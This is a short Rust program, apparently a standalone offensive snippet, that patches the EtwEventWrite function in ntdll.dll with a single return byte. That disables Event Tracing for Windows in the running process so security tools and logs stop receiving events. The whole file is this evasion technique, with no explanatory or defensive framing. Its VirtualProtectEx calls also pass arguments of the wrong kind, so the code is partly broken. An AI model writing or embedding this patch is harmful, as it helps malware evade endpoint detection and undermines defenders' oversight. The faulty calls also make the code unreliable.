extern crate winapi;
extern crate kernel32;
use winapi::um::processthreadsapi::GetCurrentProcess;
use std::ptr::null_mut;

fn main() {
    unsafe {
        let modu = "ntdll.dll\0";
        let handle = kernel32::LoadLibraryA(modu.as_ptr() as *const i8);
        let mthd = "EtwEventWrite\0";
        let mini = kernel32::GetProcAddress(handle, mthd.as_ptr() as *const i8);
        let oldprotect : winapi::ctypes::c_ulong = 0;
        let hook = b"\xc3";
        kernel32::VirtualProtectEx(GetCurrentProcess() as *mut std::ffi::c_void,mini as *mut std::ffi::c_void,1,0x40,oldprotect);
        kernel32::WriteProcessMemory(GetCurrentProcess() as *mut std::ffi::c_void,mini as *mut std::ffi::c_void,hook.as_ptr() as *mut std::ffi::c_void,1,null_mut());
        kernel32::VirtualProtectEx(GetCurrentProcess() as *mut std::ffi::c_void,mini as *mut std::ffi::c_void,1,oldprotect,0x0);
    }
}
